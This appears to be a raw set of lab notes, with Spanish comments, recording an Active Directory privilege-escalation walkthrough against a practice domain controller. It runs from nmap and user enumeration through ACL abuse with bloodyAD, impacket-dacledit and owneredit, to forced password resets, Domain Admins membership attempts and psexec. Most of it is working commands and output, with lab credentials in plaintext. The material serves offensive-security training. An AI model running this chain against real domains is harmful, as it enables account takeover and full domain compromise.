sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 192.168.56.105 -oN scan.txt



└─$ sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 192.168.56.105 -oN scan.txt

[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 15:59 EDT
Nmap scan report for 192.168.56.105
Host is up (0.00065s latency).
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49683/tcp open  unknown
49688/tcp open  unknown
49704/tcp open  unknown
MAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/elevator]
└─$ 



------------------------------------------------------------------------
grep '^[0-9]' scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','




------------------------------------------------------------------------

nmap -p135,139,3268,3269,389,445,464,49664,49668,49670,49671,49676,49683,49688,49704,53,593,5985,636,80,88,9389 -sV -sC -Pn -vvv -n 192.168.56.105 -oN fullScan.txt 






─$ nmap -p135,139,3268,3269,389,445,464,49664,49668,49670,49671,49676,49683,49688,49704,53,593,5985,636,80,88,9389 -sV -sC -Pn -vvv -n 192.168.56.105 -oN fullScan.txt 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 16:01 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:01
Completed NSE at 16:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:01
Completed NSE at 16:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:01
Completed NSE at 16:01, 0.00s elapsed
Initiating ARP Ping Scan at 16:01
Scanning 192.168.56.105 [1 port]
Completed ARP Ping Scan at 16:01, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:01
Scanning 192.168.56.105 [22 ports]

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 128 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2025-09-05 20:01:54Z)
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 128
464/tcp   open  kpasswd5?     syn-ack ttl 128
593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 128
3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 128
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49683/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49688/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: ELEVATOR; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 24599/tcp): CLEAN (Timeout)
|   Check 2 (port 42896/tcp): CLEAN (Timeout)
|   Check 3 (port 16778/udp): CLEAN (Timeout)
|   Check 4 (port 50485/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-09-05T20:02:42
|_  start_date: N/A
| nbstat: NetBIOS name: ELEVATOR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f5:3d:b0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   ELEVATOR<00>         Flags: <unique><active>
|   BLOODHOUND<00>       Flags: <group><active>
|   BLOODHOUND<1c>       Flags: <group><active>
|   ELEVATOR<20>         Flags: <unique><active>
|   BLOODHOUND<1b>       Flags: <unique><active>
| Statistics:
|   08:00:27:f5:3d:b0:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:03
Completed NSE at 16:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:03
Completed NSE at 16:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:03
Completed NSE at 16:03, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.39 seconds
           Raw packets sent: 23 (996B) | Rcvd: 23 (996B)
                                                                                                                                                                                                                                                           

------------------------------------------------------------------------
┌──(kali㉿kali)-[~/Documents/elevator]
└─$ netexec smb 192.168.56.105                                
SMB         192.168.56.105  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
                                                                                                                                                                                                    

------------------------------------------------------------------------
john.smith
Rk436\#Z4&




rpcclient -U 'john.smith%Rk436\#Z4&' 192.168.56.105 



┌──(kali㉿kali)-[~/Documents/elevator]
└─$ rpcclient -U 'john.smith%Rk436\#Z4&' 192.168.56.105
rpcclient $> enumdomusers
user:[Administrador] rid:[0x1f4]
user:[Invitado] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[michael.jones] rid:[0x454]
user:[john.smith] rid:[0x455]
user:[mary.johnson] rid:[0x457]
user:[robert.williams] rid:[0x458]
user:[patricia.brown] rid:[0x45a]
rpcclient $> 


cat userK.txt | grep -oP '(?<=\[).*?(?=\])' | grep -v "0x" > usuarios_limpios.txt



-----------------------------------------------------------------------



┌──(kali㉿kali)-[~/Documents/elevator/elevator-docker]
└─$ netexec smb 192.168.56.105  -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute                   
SMB         192.168.56.105  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.105  445    ELEVATOR         [+] bloodhound.thl\john.smith:Rk436\#Z4& 
SMB         192.168.56.105  445    ELEVATOR         498: BLOODHOUND\Enterprise Domain Controllers de sólo lectura (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         500: BLOODHOUND\Administrador (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         501: BLOODHOUND\Invitado (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         502: BLOODHOUND\krbtgt (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         512: BLOODHOUND\Admins. del dominio (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         513: BLOODHOUND\Usuarios del dominio (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         514: BLOODHOUND\Invitados del dominio (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         515: BLOODHOUND\Equipos del dominio (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         516: BLOODHOUND\Controladores de dominio (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         517: BLOODHOUND\Publicadores de certificados (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         518: BLOODHOUND\Administradores de esquema (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         519: BLOODHOUND\Administradores de empresas (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         520: BLOODHOUND\Propietarios del creador de directivas de grupo (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         521: BLOODHOUND\Controladores de dominio de sólo lectura (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         522: BLOODHOUND\Controladores de dominio clonables (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         525: BLOODHOUND\Protected Users (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         526: BLOODHOUND\Administradores clave (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         527: BLOODHOUND\Administradores clave de la organización (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         553: BLOODHOUND\Servidores RAS e IAS (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         571: BLOODHOUND\Grupo de replicación de contraseña RODC permitida (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         572: BLOODHOUND\Grupo de replicación de contraseña RODC denegada (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         1000: BLOODHOUND\ELEVATOR$ (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1101: BLOODHOUND\DnsAdmins (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         1102: BLOODHOUND\DnsUpdateProxy (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         1103: BLOODHOUND\Usuarios de DHCP (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         1104: BLOODHOUND\Administradores de DHCP (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         1108: BLOODHOUND\michael.jones (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1109: BLOODHOUND\john.smith (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1110: BLOODHOUND\finanzas (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         1111: BLOODHOUND\mary.johnson (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1112: BLOODHOUND\robert.williams (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1113: BLOODHOUND\marketing (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         1114: BLOODHOUND\patricia.brown (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1115: BLOODHOUND\operaciones (SidTypeGroup)
                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/elevator/elevator-docker]
└─$ netexec smb 192.168.56.105  -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute
SMB         192.168.56.105  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.105  445    ELEVATOR         [+] bloodhound.thl\john.smith:Rk436\#Z4& 
SMB         192.168.56.105  445    ELEVATOR         498: BLOODHOUND\Enterprise Domain Controllers de sólo lectura (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         500: BLOODHOUND\Administrador (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         501: BLOODHOUND\Invitado (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         502: BLOODHOUND\krbtgt (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         512: BLOODHOUND\Admins. del dominio (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         513: BLOODHOUND\Usuarios del dominio (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         514: BLOODHOUND\Invitados del dominio (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         515: BLOODHOUND\Equipos del dominio (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         516: BLOODHOUND\Controladores de dominio (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         517: BLOODHOUND\Publicadores de certificados (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         518: BLOODHOUND\Administradores de esquema (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         519: BLOODHOUND\Administradores de empresas (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         520: BLOODHOUND\Propietarios del creador de directivas de grupo (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         521: BLOODHOUND\Controladores de dominio de sólo lectura (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         522: BLOODHOUND\Controladores de dominio clonables (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         525: BLOODHOUND\Protected Users (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         526: BLOODHOUND\Administradores clave (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         527: BLOODHOUND\Administradores clave de la organización (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         553: BLOODHOUND\Servidores RAS e IAS (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         571: BLOODHOUND\Grupo de replicación de contraseña RODC permitida (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         572: BLOODHOUND\Grupo de replicación de contraseña RODC denegada (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         1000: BLOODHOUND\ELEVATOR$ (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1101: BLOODHOUND\DnsAdmins (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         1102: BLOODHOUND\DnsUpdateProxy (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         1103: BLOODHOUND\Usuarios de DHCP (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         1104: BLOODHOUND\Administradores de DHCP (SidTypeAlias)
SMB         192.168.56.105  445    ELEVATOR         1108: BLOODHOUND\michael.jones (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1109: BLOODHOUND\john.smith (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1110: BLOODHOUND\finanzas (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         1111: BLOODHOUND\mary.johnson (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1112: BLOODHOUND\robert.williams (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1113: BLOODHOUND\marketing (SidTypeGroup)
SMB         192.168.56.105  445    ELEVATOR         1114: BLOODHOUND\patricia.brown (SidTypeUser)
SMB         192.168.56.105  445    ELEVATOR         1115: BLOODHOUND\operaciones (SidTypeGroup)
                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/elevator/elevator-docker]
└─$ netexec smb 192.168.56.105  -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute | grep SidTypeUser
SMB                      192.168.56.105  445    ELEVATOR         500: BLOODHOUND\Administrador (SidTypeUser)
SMB                      192.168.56.105  445    ELEVATOR         501: BLOODHOUND\Invitado (SidTypeUser)
SMB                      192.168.56.105  445    ELEVATOR         502: BLOODHOUND\krbtgt (SidTypeUser)
SMB                      192.168.56.105  445    ELEVATOR         1000: BLOODHOUND\ELEVATOR$ (SidTypeUser)
SMB                      192.168.56.105  445    ELEVATOR         1108: BLOODHOUND\michael.jones (SidTypeUser)
SMB                      192.168.56.105  445    ELEVATOR         1109: BLOODHOUND\john.smith (SidTypeUser)
SMB                      192.168.56.105  445    ELEVATOR         1111: BLOODHOUND\mary.johnson (SidTypeUser)
SMB                      192.168.56.105  445    ELEVATOR         1112: BLOODHOUND\robert.williams (SidTypeUser)
SMB                      192.168.56.105  445    ELEVATOR         1114: BLOODHOUND\patricia.brown (SidTypeUser)


------------------------------------------------------------------------


impacket-GetNPUsers -usersfile usuarios_limpios.txt -no-pass bloodhound.thl/  


 kerbrute userenum --dc bloodhound.thl -d bloodhound.thl usuarios_limpios.txt   



└─$  kerbrute userenum --dc bloodhound.thl -d bloodhound.thl usuarios_limpios.txt   

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/05/25 - Ronnie Flathers @ropnop

2025/09/05 16:18:01 >  Using KDC(s):
2025/09/05 16:18:01 >   bloodhound.thl:88

2025/09/05 16:18:01 >  [+] VALID USERNAME:       robert.williams@bloodhound.thl
2025/09/05 16:18:01 >  [+] VALID USERNAME:       mary.johnson@bloodhound.thl
2025/09/05 16:18:01 >  [+] VALID USERNAME:       john.smith@bloodhound.thl
2025/09/05 16:18:01 >  [+] VALID USERNAME:       patricia.brown@bloodhound.thl
2025/09/05 16:18:01 >  [+] VALID USERNAME:       Administrador@bloodhound.thl
2025/09/05 16:18:01 >  [+] VALID USERNAME:       michael.jones@bloodhound.thl
2025/09/05 16:18:01 >  Done! Tested 8 usernames (6 valid) in 0.002 seconds
                                                                                                                                                                                                                                                            

------------------------------------------------------------------------


impacket-GetUserSPNs bloodhound.thl/john.smith:'Rk436\#Z4&' -request


netexec winrm -i 192.168.56.105 -u john.smith -p 'Rk436\#Z4&'



smbmap -H  192.168.56.105 -u john.smith -p 'Rk436\#Z4&'


netexec smb  192.168.56.105 -u john.smith -p 'Rk436\#Z4&' --shares



netexec smb 192.168.56.105  -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute | grep SidTypeUser

------------------------------------------------------------------------

sudo apt-get install dnsmasq
                                                                                                                                                                                                                                                           
nano /etc/dnsmasq.conf    

address=/ELEVATOR.bloodhound.thl/192.168.56.103

 systemctl restart dnsmasq  
------------------------------------------------------------------------



bloodhound-python -u 'john.smith' -p 'Rk436\#Z4&' -d bloodhound.thl -dc ELEVATOR.bloodhound.thl -ns 127.0.0.1 --disable-autogc -c All --zip



------------------------------------------------------------------------


# Agregamos al usuario john.smith al grupo de FINANZAS


rpcclient $> enumdomusers
user:[Administrador] rid:[0x1f4]
user:[Invitado] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[michael.jones] rid:[0x454]
user:[john.smith] rid:[0x455]
user:[mary.johnson] rid:[0x457]
user:[robert.williams] rid:[0x458]
user:[patricia.brown] rid:[0x45a]


rpcclient $> enumdomgroups
group:[DnsUpdateProxy] rid:[0x44e]
group:[finanzas] rid:[0x456]


## Antes de Agregar
rpcclient $> querygroupmem 0x456

### Agregamos al usuario john.smith

bloodyAD --host dc.bloodhound.thl -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z4&' add groupMember FINANZAS john.smith


## Despues de agregar de Agregar
rpcclient $> querygroupmem 0x456
        rid:[0x455] attr:[0x7]

rpcclient $> queryuser 0x455
        User Name   :   john.smith
        Full Name   :   John Smith
        Home Drive  :
        Dir Drive   :
        user_rid :      0x455

------------------------------------------------------------------------

## Ahora el grupo Finanzas tiene privilegios sobre los usuario de mary.johnson


net rpc password "mary.johnson" "Patito12345" -U "bloodhound.thl"/"john.smith"%"Rk436\#Z4&" -S 192.168.56.105


---bloodyAD --host dc.bloodhound.thl -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z4&' set password MARY.JOHNSON Abc123456@    



netexec smb 192.168.56.105 -u mary.johnson -p 'Patito12345'

SMB         192.168.56.105  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.105  445    ELEVATOR         [+] bloodhound.thl\mary.johnson:Patito12345 
                                                                                                                                                                                                                                                  

------------------------------------------------------------------------
## Ahora mary.johnson tiene privilegios para cambiar la contrasena al usuario robert.williams


net rpc password "robert.williams" "Patito12345" -U "bloodhound.thl"/"mary.johnson"%"Patito12345" -S 192.168.56.105



netexec smb 192.168.56.105 -u robert.williams -p 'Patito12345'

└─$ netexec smb 192.168.56.105 -u robert.williams -p 'Patito12345'                                                      

SMB         192.168.56.105  445    ELEVATOR         [*] Windows Server 2022 Build 20348 x64 (name:ELEVATOR) (domain:bloodhound.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.105  445    ELEVATOR         [+] bloodhound.thl\robert.williams:Patito12345 
                                                                                                    

------------------------------------------------------------------------

## En el grupo de MARKETING esta el usuario   robert.williams


rpcclient $> enumdomgroups
group:[finanzas] rid:[0x456]
group:[marketing] rid:[0x459]
group:[operaciones] rid:[0x45b]

rpcclient $> querygroupmem 0x459
        rid:[0x458] attr:[0x7]

rpcclient $> queryuser 0x458
        User Name   :   robert.williams
        Full Name   :   Robert Williams





impacket-dacledit -action 'write' -rights 'FullControl' -principal 'robert.williams' -target 'patricia.brown' 'bloodhound.thl/robert.williams:Patito12345'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
[*] DACL backed up to dacledit-20250905-194526.bak
[*] DACL modified successfully!
                                                                                                                                                                                                         


### Vamos a cambiarle de contrasena a PATRICIA

net rpc password "patricia.brown" "Patito12345" -U "bloodhound.thl"/"robert.williams"%"Patito12345" -S 192.168.56.105



netexec smb 192.168.56.105 -u patricia.brown -p 'Patito12345' 




------------------------------------------------------------------------


### PATRICIA.BROWN se convierta en la propietaria del grupo OPERACIONES.

Esto es crítico porque ahora podrá modificar permisos del grupo y abusar de ellos para escalar privilegios.



impacket-owneredit -action write -new-owner 'patricia.brown' -target 'OPERACIONES' 'bloodhound.thl/patricia.brown:Patito12345'



impacket-owneredit -action write -new-owner 'patricia.brown' -target 'CN=operaciones,OU=operaciones,DC=bloodhound,DC=thl' 'bloodhound.thl/patricia.brown:Patito12345'



Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
[*] Current owner information below
[*] - SID: S-1-5-21-3580157585-956322742-780763674-1114
[*] - sAMAccountName: patricia.brown
[*] - distinguishedName: CN=Patricia Brown,CN=Users,DC=bloodhound,DC=thl
[*] OwnerSid modified successfully!





### Este comando modifica la ACL del grupo OPERACIONES y le da a  patricia.brown el permiso de agregar o quitar miembros del grupo.


impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'patricia.brown' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=bloodhound,DC=thl'  'bloodhound.thl/patricia.brown:Patito12345'


==== impacket-dacledit -action write -rights WriteMembers -principal 'PATRICIA.BROWN' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=bloodhound,DC=thl' 'bloodhound.thl/PATRICIA.BROWN:Patito12345'

==== impacket-dacledit -action write -rights WriteMembers -principal 'patricia.brown'  -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL'  'bloodhound.thl/PATRICIA.BROWN:Abc123456@'


Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250905-195515.bak
[*] DACL modified successfully!



# A partir de este momento, PATRICIA.BROWN puede meterse a sí misma (o a cualquier otro usuario) dentro del grupo OPERACIONES.


└─ net rpc group addmem 'OPERACIONES' 'patricia.brown' -U 'bloodhound.thl/patricia.brown%Patito12345' -S elevator.bloodhound.thl
                                                                                                                                                                                                                                                            
└─ net rpc group addmem 'OPERACIONES' 'michael.jones' -U 'bloodhound.thl/patricia.brown%Patito12345' -S elevator.bloodhound.thl




## net rpc group delmem 'OPERACIONES' 'patricia.brown' -U 'bloodhound.thl/patricia.brown%Patito12345' -S elevator.bloodhound.thl



## bloodyAD --host ELEVATOR.bloodhound.thl -d bloodhound.thl -u 'patricia.brown' -p 'Patito12345' add groupMember OPERACIONES patricia.brown


roup:[Enterprise Domain Controllers de sólo lectura] rid:[0x1f2]
group:[Administradores clave de la organización] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[finanzas] rid:[0x456]
group:[marketing] rid:[0x459]
group:[operaciones] rid:[0x45b]


rpcclient $> querygroupmem 0x45b
        rid:[0x45a] attr:[0x7]

rpcclient $> queryuser 0x45a
        User Name   :   patricia.brown
        Full Name   :   Patricia Brown
        Home Drive  :
        Dir Drive   :


------------------------------------------------------------------------



### Vamos a cambiarle de contrasena al usuario michael.jones

net rpc password "michael.jones" "Patito12345" -U "bloodhound.thl"/"patricia.brown"%"Patito12345" -S 192.168.56.105

bloodyAD --host ELEVATOR.bloodhound.thl -d bloodhound.thl -u 'patricia.brown' -p 'Patito12345' set password michael.jones 'Patito12345'

netexec smb 192.168.56.105 -u michael.jones -p 'Patito12345' 




netexec winrm -i 192.168.56.105 -u patricia.brown -p 'Patito12345'



impacket-changepasswd bloodhound.thl/patricia.brown@192.168.56.105 -newpass Patito12345 -altuser  bloodhound.thl/michael.jones -altpass Password@1 -reset
                 

impacket-changepasswd bloodhound.thl/michael.jones@192.168.56.105 -newpass 'Password@987' -p rpc-samr

bloodyAD --host "192.168.56.105" -d "bloodhound.thl" -u "patricia.brown" -p "Patito12345" add groupMember "Domain Admins" "patricia.brown"


impacket-psexec patricia.brow:Patito12345@1@bloodhound.thl -dc-ip 192.168.56.105


impacket-dacledit -action 'write' -rights 'FullControl' -principal 'patricia.brown' -target 'michael.jones' 'bloodhound.thl/patricia.brown:Patito12345'

------------------------------------------------------------------------

--wmi "SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'"

------------------------------------------------------------------------

------------------------------------------------------------------------
------------------------------------------------------------------------

------------------------------------------------------------------------

------------------------------------------------------------------------

